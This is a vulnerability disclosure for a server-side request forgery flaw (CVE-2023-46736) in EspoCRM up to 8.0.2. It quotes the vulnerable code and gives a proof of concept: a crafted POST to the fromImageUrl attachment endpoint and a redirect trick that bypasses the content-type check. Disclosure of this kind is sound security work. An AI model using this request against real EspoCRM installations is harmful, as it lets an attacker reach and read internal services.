### EspoCRM <=8.0.2 SSRF

EspoCRM <=8.0.2 is vulnerable SSRF

Source: `Espo\Core\Api\Request::getParsedBody`

Sink: `curl_exec`

Code:

application/Espo/Tools/Attachment/Api/PostFromImageUrl.php

```
public function process(Request $request): Response
{
  $data = $request->getParsedBody();
  $url = $data->url ?? null;
  ...
  $attachment = $this->uploadUrlService->uploadImage($url, $fieldData);
 }
```

application/Espo/Tools/Attachment/UploadUrlService.php

```
public function uploadImage(string $url, FieldData $data): Attachment
{
  $this->getImageDataByUrl($url);
}

private function getImageDataByUrl(string $url): ?array {
  ...
  $opts[\CURLOPT_URL]  = $url;
  ...
  $ch = curl_init();
  curl_setopt_array($ch, $opts);
  $response = curl_exec($ch);
}
```

POC:

1. Listen on 8080 on server side

2. Send a post request to /api/v1/Attachment/fromImageUrl, with data 
   ``````
   {
   "url": "http://localhost:8888",
   "parentType": "Note",
    "field":  "attachments"
   }
   ``````

3. Receive a request on server side. 

4. To bypass content type check, redirect like https://ssrf.localdomain.pw/img-with-body/301-http-127.0.0.1:8888-.i.jpg can be used. Then retrieve the response back through /api/v1/Attachment/file/id endpoint

Status: CVE-2023-46736